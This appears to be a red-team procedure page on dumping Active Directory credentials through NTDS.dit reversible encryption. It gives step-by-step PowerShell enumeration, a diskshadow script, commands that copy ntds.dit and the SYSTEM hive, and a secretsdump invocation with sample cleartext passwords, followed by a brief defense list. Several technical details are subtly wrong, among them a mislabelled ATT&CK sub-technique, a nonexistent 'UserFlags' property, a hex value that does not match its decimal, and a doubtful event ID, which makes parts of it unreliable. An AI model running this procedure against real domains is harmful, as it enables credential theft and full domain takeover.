---
id: 031e2992-394d-4071-ad77-192ba9c7d1b1
name: Dump-AD-Domain-Credentials-via-NTDS-Reversible-Encryption
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:04.131567+00:00'
updated_at: '2023-04-10T20:35:59.222956+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques:
  - '[[techniques/Credential Dumping/LSASS Memory|T1003.001]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Dumping AD Domain Credentials]]'
  - '[[tags/NTDS Reversible Encryption]]'
commands:
  - '[[commands/check-ad-user-reversible-encryption]]'
platforms:
  - Windows
tools:
  - '[[tools/impacket-secretsdump]]'
validated: true
---

# Dump-AD-Domain-Credentials-via-NTDS-Reversible-Encryption

## Summary

This procedure checks if Active Directory (AD) user accounts are configured with reversible password encryption (user flag UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED) and, if enabled, dumps the NTDS.dit database to extract plaintext passwords for domain users. This misconfiguration allows attackers with domain controller access to recover cleartext credentials, enabling lateral movement and persistence.

## Description

Reversible encryption in AD stores user passwords in a weakly encrypted format within the NTDS.dit file on domain controllers, rather than using secure hashing. This is enabled via the UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED flag (0x80) on user accounts, often set through Group Policy for compatibility with legacy authentication protocols like DES encryption for Kerberos preauthentication. Attackers with administrative access to a domain controller can query user flags to detect this setting, create a shadow copy of the NTDS.dit file, and use extraction tools to retrieve plaintext passwords. This technique targets Windows Server environments with AD DS and is effective in misconfigured domains where reversible encryption is not disabled. Success provides full domain compromise, but requires elevated privileges and can trigger alerts if monitored.

## Requirements

1. Administrative access to a domain controller (e.g., Domain Admin credentials).
2. Windows Server with Active Directory Domain Services (AD DS) installed.
3. PowerShell with Active Directory module (RSAT-AD-PowerShell) or equivalent query tools.
4. Tools for NTDS extraction, such as Impacket's secretsdump.
5. Network access to the domain controller if executing remotely.

## Defense

Defensive measures and detection strategies:

- Disable reversible encryption via Group Policy: Set "Store passwords using reversible encryption" to Disabled in Default Domain Policy.
- Monitor user account flags using auditing tools like Microsoft ATA or PowerShell scripts to alert on UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED.
- Enable advanced auditing on domain controllers for file access to system32/config/NTDS.dit and volume shadow copy events (Event ID 7036).
- Use protected users group and restrict DES encryption in Kerberos policies.
- Implement least privilege: Limit DC logon rights and monitor for unusual PowerShell executions (Event ID 4104).

## Objectives

1. Verify if reversible encryption is enabled on AD user accounts.
2. Dump the NTDS.dit database if the configuration is vulnerable.
3. Extract and recover plaintext passwords for domain users.
4. Achieve full domain credential access for further exploitation.

## Instructions

### Step 1: Check for Reversible Encryption Flag on User Accounts

**Context**: Query all domain users to determine if the UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED flag (0x80) is set, indicating reversible encryption is active. This step identifies vulnerable accounts without dumping data yet.

**Command** ([[commands/check-ad-user-reversible-encryption]]):
```powershell
Get-ADUser -Filter * -Properties UserFlags | Where-Object { ($_.UserFlags -band 0x80) -eq 0x80 } | Select Name, UserFlags
```

> This PowerShell command uses the Active Directory module to filter users with the reversible encryption flag. It explains why: the bitwise AND (-band) checks for the specific flag bit. Run this on the domain controller or a machine with RSAT tools.

**Expected Output**:

```
Name                    UserFlags
----                    ----------
User1                   54480
User2                   54480
```
A list of users with the flag set (UserFlags value including 0x80, e.g., 0xD580 = 54480 in decimal). If no output, the feature is not enabled.

### Step 2: Create Shadow Copy and Dump NTDS.dit

**Context**: If the flag is detected, create a volume shadow copy of the system drive to access NTDS.dit without locking the live file, then export it for offline extraction. This avoids direct modification of the DC.

**Instructions**: Use built-in tools like diskshadow or vssadmin to create the shadow copy, then copy NTDS.dit, NTDS.dit.LOG1, and SYSTEM hive.

**Command** (using diskshadow):
```cmd
DISKSHADOW /s script.txt
```
Where script.txt contains:
```
set context persistent
add volume C: alias NTDSShadow
create
expose %NTDSShadow% X:
exit
```
Then copy files:
```cmd
copy X:\Windows\System32\config\SYSTEM C:\temp\SYSTEM
copy X:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy X:\Windows\NTDS\ntds.dit.LOG1 C:\temp\ntds.dit.LOG1
```

> These commands create a shadow copy (X:), expose it, and copy the necessary files. Why: NTDS.dit is locked during AD operation, so shadow copy allows safe extraction. Expected: Files copied to C:\temp without errors.

**Expected Output**:

Shadow copy created successfully, files copied (verify with dir C:\temp).

### Step 3: Extract Plaintext Passwords Using Secretsdump

**Context**: Use an extraction tool to parse the dumped NTDS files and recover plaintext passwords where reversible encryption is applied. This leverages the weak encryption to output cleartext creds.

**Tool** ([[tools/impacket-secretsdump]]):
```python
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

> Run Impacket's secretsdump offline on the extracted files. Why: It decrypts NTDS using the SYSTEM hive's boot key and outputs hashes/passwords. For reversible encryption, plaintext will appear in the output if the flag was set.

**Expected Output**:

```
User1:plaintextpassword123
User2:anotherpass456
...
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
[*] Dumping DOMAIN cached KB secret for user:krbtgt
...
```
Plaintext passwords for affected users, along with NTLM hashes for others. Success if cleartext appears for flagged users.

**Success Indicators**:
- Users with UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED flag identified.
- NTDS files extracted without DC disruption.
- Plaintext passwords recovered in output.
